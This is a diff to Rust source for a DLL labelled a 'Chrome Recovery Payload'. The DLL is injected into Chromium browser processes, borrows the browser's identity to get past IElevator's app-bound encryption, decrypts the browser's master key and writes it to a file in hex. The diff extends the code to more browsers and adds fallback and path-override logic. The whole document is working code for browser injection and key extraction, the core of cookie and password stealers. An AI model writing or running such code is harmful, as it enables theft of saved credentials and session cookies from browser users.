@@ -1,10 +1,8 @@
 //! Chrome Recovery Payload DLL
 //!
 //! Injected into a Chromium-based browser process.  Runs inside the browser's
-//! security identity so IElevator accepts our COM call.  Supports:
-//!   - Google Chrome (stable, Beta, Dev, Canary)
-//!   - Brave Browser
-//!   - Microsoft Edge
+//! security identity so IElevator accepts our COM call.  Supports all major
+//! Chromium browsers (Chrome, Edge, Brave, Opera, Vivaldi, Yandex, etc.).
 
 #![allow(non_snake_case, unused)]
 
@@ -24,6 +22,8 @@ use windows::{
 
 const APPB: &[u8; 4] = b"APPB";
 const RESULT_ENV: &str = "CHROME_RECOVERY_RESULT";
+const USER_DATA_ENV: &str = "CHROME_RECOVERY_USER_DATA_REL";
+const DATA_ROOT_ENV: &str = "CHROME_RECOVERY_DATA_ROOT";
 
 // ── DllMain ───────────────────────────────────────────────────────────────────
 
@@ -58,20 +58,7 @@ fn run() -> Result<(), String> {
         .map(|p| p.to_string_lossy().to_lowercase())
         .unwrap_or_default();
 
-    let browser = elevator::resolve_browser(&exe)
-        .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;
-
-    // Locate Local State for the detected browser.
-    let local_appdata = std::env::var("LOCALAPPDATA")
-        .map_err(|_| "LOCALAPPDATA not set")?;
-
-    let local_state_path = PathBuf::from(&local_appdata)
-        .join(browser.user_data_rel)
-        .join("Local State");
-
-    if !local_state_path.exists() {
-        return Err(format!("Local State not found: {}", local_state_path.display()));
-    }
+    let local_state_path = resolve_local_state_path(&exe)?;
 
     // Parse Local State JSON.
     let raw = std::fs::read_to_string(&local_state_path)
@@ -97,15 +84,21 @@ fn run() -> Result<(), String> {
     }
     let encrypted_key = &encrypted_key[4..];
 
-    let master_key = elevator::decrypt_for_browser(browser, encrypted_key)
-        .map_err(|e| format!("IElevator: {e}"))?;
+    let browser = elevator::resolve_browser(&exe);
+    let master_key = match browser {
+        Some(b) => elevator::decrypt_for_browser(b, encrypted_key)
+            .or_else(|_| elevator::decrypt_app_bound_key(encrypted_key)),
+        None => elevator::decrypt_app_bound_key(encrypted_key),
+    }
+    .map_err(|e| format!("IElevator: {e}"))?;
 
     if master_key.len() != 32 {
         return Err(format!("unexpected key length: {} (want 32)", master_key.len()));
     }
 
+    let browser_label = browser.map(|b| b.name).unwrap_or("Chromium");
     let result = serde_json::json!({
-        "browser": browser.name,
+        "browser": browser_label,
         "master_key_hex": master_key.iter().map(|b| format!("{b:02x}")).collect::<String>(),
     });
 
@@ -114,6 +107,38 @@ fn run() -> Result<(), String> {
     std::fs::write(&path, json).map_err(|e| format!("write result: {e}"))?;
 
     Ok(())
+}
+
+fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
+    if let Ok(rel) = std::env::var(USER_DATA_ENV) {
+        let root = match std::env::var(DATA_ROOT_ENV).as_deref() {
+            Ok("roaming") => std::env::var("APPDATA"),
+            _ => std::env::var("LOCALAPPDATA"),
+        }
+        .map_err(|_| "APPDATA/LOCALAPPDATA not set")?;
+
+        let path = PathBuf::from(&root).join(rel).join("Local State");
+        if path.exists() {
+            return Ok(path);
+        }
+        return Err(format!("Local State not found: {}", path.display()));
+    }
+
+    let browser = elevator::resolve_browser(exe)
+        .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;
+
+    let local_appdata = std::env::var("LOCALAPPDATA")
+        .map_err(|_| "LOCALAPPDATA not set")?;
+
+    let local_state_path = PathBuf::from(&local_appdata)
+        .join(browser.user_data_rel)
+        .join("Local State");
+
+    if !local_state_path.exists() {
+        return Err(format!("Local State not found: {}", local_state_path.display()));
+    }
+
+    Ok(local_state_path)
 }
 
 fn result_path() -> PathBuf {
